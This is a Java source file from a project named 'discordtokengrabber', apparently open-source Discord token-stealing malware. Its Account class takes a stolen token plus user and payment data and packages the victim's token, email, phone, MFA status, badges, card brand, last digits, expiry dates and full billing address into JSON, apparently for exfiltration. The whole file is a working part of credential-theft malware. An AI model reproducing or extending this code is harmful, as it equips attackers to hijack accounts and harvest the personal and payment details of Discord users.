package com.github.dedinc.discordtokengrabber.objects;

import com.github.dedinc.discordtokengrabber.utils.Checker;
import com.github.dedinc.discordtokengrabber.utils.Helper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.List;

public class Account {
    private final String token;
    private final String id;
    private final String username;
    private final String email;
    private final String phone;
    private final String nitro;
    private final boolean verified;
    private final boolean mfa;
    private final List<String> badges;
    private final List<Payment> paymentSources;

    private Account(
            String token,
            String id,
            String username,
            String email,
            String phone,
            String nitro,
            boolean verified,
            boolean mfa,
            List<String> badges,
            List<Payment> paymentSources
    ) {
        this.token = token;
        this.id = id;
        this.username = username;
        this.email = email;
        this.phone = phone;
        this.nitro = nitro;
        this.verified = verified;
        this.mfa = mfa;
        this.badges = badges;
        this.paymentSources = paymentSources;
    }

    public static Account parse(String token, JSONObject user, JSONArray paymentSources) {
        Checker checker = Helper.getChecker();
        return new Account(
                token,
                user.getString("id"),
                user.getString("username"),
                user.getString("email"),
                user.getString("phone"),
                checker.getNitroByType(user.getInt("premium_type")),
                user.getBoolean("verified"),
                user.getBoolean("mfa_enabled"),
                checker.getBadgesFromFlags(user.getInt("public_flags")),
                checker.getPaymentsFromArray(paymentSources)
        );
    }

    public final String getToken() {
        return this.token;
    }

    public final String getId() {
        return this.id;
    }

    public final String getUsername() {
        return this.username;
    }

    public final List<String> getBadges() {
        return this.badges;
    }

    public final String getEmail() {
        return this.email;
    }

    public final String getPhone() {
        return this.phone;
    }

    public final boolean isVerified() {
        return this.verified;
    }

    public final boolean isMfa() {
        return this.mfa;
    }

    public final List<Payment> getPayments() {
        return this.paymentSources;
    }

    public String getNitro() {
        return nitro;
    }

    public final JSONObject getJSONFormat() {
        JSONObject json = new JSONObject();
        json.put("token", token);
        json.put("id", id);
        json.put("username", username);
        json.put("email", email);
        json.put("verified", verified);
        json.put("mfa", mfa);
        json.put("phone", phone);
        json.put("nitro", nitro);
        JSONArray badgesJson = new JSONArray();
        for (String badge : badges) {
            badgesJson.put(badge);
        }
        json.put("badges", badgesJson);
        JSONArray paymentsJson = new JSONArray();
        for (Payment payment : paymentSources) {
            JSONObject paymentJson = new JSONObject();
            paymentJson.put("brand", payment.getBrand());
            paymentJson.put("lastNumbers", payment.getLastNumbers());
            paymentJson.put("country", payment.getCountry());
            paymentJson.put("expiresMonth", payment.getExpiresMonth());
            paymentJson.put("expiresYear", payment.getExpiresYear());
            Address address = payment.getBillingAddress();
            JSONObject addressJson = new JSONObject();
            addressJson.put("name", address.getName());
            addressJson.put("lineOne", address.getLineOne());
            addressJson.put("lineTwo", address.getLineTwo());
            addressJson.put("city", address.getCity());
            addressJson.put("state", address.getState());
            addressJson.put("country", address.getCountry());
            addressJson.put("postalCode", address.getPostalCode());
            paymentJson.put("billingAddress", addressJson);
            paymentsJson.put(paymentJson);
        }
        json.put("paymentSources", paymentsJson);
        return json;
    }
}